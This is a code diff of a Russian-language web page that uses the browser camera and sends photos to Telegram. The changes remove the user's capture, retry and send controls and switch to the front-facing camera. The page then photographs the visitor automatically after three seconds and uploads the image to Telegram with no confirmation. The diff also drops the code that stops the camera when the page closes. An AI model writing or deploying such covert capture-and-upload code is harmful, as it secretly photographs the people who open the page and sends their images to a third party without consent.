@@ -80,9 +80,6 @@
         
         <div id="buttons">
             <button id="startButton" class="button">Запустить камеру</button>
-            <button id="captureButton" class="button" style="display: none;">Сделать фото</button>
-            <button id="retryButton" class="button" style="display: none;">Новое фото</button>
-            <button id="sendButton" class="button" style="display: none;">Отправить в Telegram</button>
         </div>
         
         <video id="video" autoplay playsinline style="display: none;"></video>
@@ -96,9 +93,6 @@
         const video = document.getElementById('video');
         const photo = document.getElementById('photo');
         const startButton = document.getElementById('startButton');
-        const captureButton = document.getElementById('captureButton');
-        const retryButton = document.getElementById('retryButton');
-        const sendButton = document.getElementById('sendButton');
         const statusElement = document.getElementById('status');
         const debugElement = document.getElementById('debug');
         
@@ -143,11 +137,11 @@
                     throw new Error("Ваш браузер не поддерживает доступ к камере");
                 }
                 
-                // Пробуем с явным указанием задней камеры
+                // Используем фронтальную камеру
                 let constraints = {
                     audio: false,
                     video: {
-                        facingMode: "environment",
+                        facingMode: "user", // Фронтальная камера
                         width: { ideal: 640 },
                         height: { ideal: 480 }
                     }
@@ -167,8 +161,9 @@
                 });
                 
                 statusElement.textContent = "Камера готова";
-                captureButton.style.display = "inline-block";
-                startButton.style.display = "none";
+                
+                // Автоматически делаем снимок через 3 секунды
+                setTimeout(takePhoto, 3000);
                 
             } catch (error) {
                 statusElement.textContent = `Ошибка: ${error.message}`;
@@ -211,33 +206,17 @@
                 photo.style.display = "block";
                 video.style.display = "none";
                 
-                // Изменяем контролы
-                captureButton.style.display = "none";
-                retryButton.style.display = "inline-block";
-                sendButton.style.display = "inline-block";
-                
-                statusElement.textContent = "Фото сделано! Можете отправить или сделать новое.";
+                statusElement.textContent = "Фото сделано! Отправляем в Telegram...";
                 log("Фото захвачено успешно");
+                
+                // Отправляем фото в Telegram
+                sendPhotoToTelegram();
                 
             } catch (error) {
                 statusElement.textContent = "Ошибка при создании снимка";
                 log(`Ошибка снимка: ${error.message}`);
                 log(`Подробности: ${error.stack}`);
             }
-        }
-        
-        // Повторно делаем снимок
-        function retryPhoto() {
-            capturedImage = null;
-            photo.style.display = "none";
-            video.style.display = "block";
-            
-            retryButton.style.display = "none";
-            sendButton.style.display = "none";
-            captureButton.style.display = "inline-block";
-            
-            statusElement.textContent = "Подготовка нового снимка...";
-            log("Подготовка к новому снимку");
         }
         
         // Отправляем фото в Telegram
@@ -249,7 +228,6 @@
             
             try {
                 statusElement.textContent = "Отправка фото...";
-                sendButton.disabled = true;
                 log("Подготовка к отправке фото в Telegram");
                 
                 // Преобразуем base64 в blob
@@ -281,32 +259,16 @@
             } catch (error) {
                 statusElement.textContent = `Ошибка при отправке: ${error.message}`;
                 log(`Ошибка отправки: ${error.message}`);
-            } finally {
-                sendButton.disabled = false;
-            }
-        }
-        
-        // Остановка камеры
-        function stopCamera() {
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-                stream = null;
-                log("Камера остановлена");
             }
         }
         
         // Обработчики событий
         startButton.addEventListener('click', startCamera);
-        captureButton.addEventListener('click', takePhoto);
-        retryButton.addEventListener('click', retryPhoto);
-        sendButton.addEventListener('click', sendPhotoToTelegram);
         
         // Логируем информацию о системе
         log(`Браузер: ${navigator.userAgent}`);
         log(`MediaDevices доступны: ${!!navigator.mediaDevices}`);
         
-        // Обработка закрытия страницы
-        window.addEventListener('beforeunload', stopCamera);
     </script>
 </body>
 </html>
